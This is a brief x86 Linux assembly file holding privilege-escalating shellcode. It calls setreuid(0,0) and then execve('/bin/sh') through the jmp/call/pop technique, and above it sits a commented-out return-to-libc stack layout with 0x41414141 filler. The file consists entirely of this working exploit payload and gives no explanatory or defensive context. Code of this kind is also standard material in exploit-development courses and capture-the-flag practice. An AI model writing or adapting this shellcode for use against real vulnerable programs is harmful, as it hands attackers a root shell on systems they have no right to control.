

;global start

;_start: 
;      push 0xb7f8cc58
;      push 0x41414141
;      push 0xb7e6b060
;      ret

global _start
_start:
      push 70
      pop eax
      mov al, 70
      xor ebx, ebx
      xor ecx, ecx
      int 0x80
      jmp short ender
starter:
      pop ebx
      xor eax, eax
      push eax
      mov [ebx+7 ], al
      mov [ebx+8 ], ebx
      mov [ebx+12], eax
      mov al, 11
      lea ecx, [ebx+8]
      lea edx, [ebx+12]
      int 0x80
ender:
      call starter
      db '/bin/shNXXXXYYYY'
